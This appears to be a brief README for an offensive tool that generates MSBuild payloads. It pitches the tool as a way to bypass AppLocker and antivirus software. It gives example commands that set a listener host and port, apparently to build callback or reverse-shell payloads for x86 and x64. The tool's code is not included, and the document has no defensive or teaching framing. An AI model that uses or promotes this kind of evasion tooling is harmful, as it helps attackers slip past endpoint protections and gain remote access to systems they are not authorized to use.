# Msbuild payload generator
Msbuild is a great way to bypass Applockers and AVs, this tool simply automates the payload creation process.

[![asciicast](https://asciinema.org/a/304065.svg)](https://asciinema.org/a/304065)

# Example 
```
sudo python msbuild_gen.py -a x86 -i 10 --lhost 192.168.220.130 --lport 9001 -m
sudo python msbuild_gen.py -a x64 -i 10 --lhost 192.168.220.130 --lport 9001
```

